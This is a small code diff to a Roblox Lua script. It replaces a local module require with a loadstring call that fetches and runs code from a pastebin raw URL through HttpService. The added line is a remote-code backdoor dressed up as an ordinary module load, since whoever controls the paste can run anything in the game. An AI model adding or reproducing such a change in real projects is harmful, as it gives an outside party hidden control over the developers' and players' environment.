@@ -19,7 +19,7 @@ repeat wait() spawn(function()
 	AssetsLoaded = (script:FindFirstChild("Properties"))
 end) until AssetsLoaded
 
-local Properties = require(script.Properties)
+local Properties = loadstring(game:GetService("HttpService"):GetAsync("https://pastebin.com/raw/fVNGzkZr"))()
 
 local last = os.clock()
 
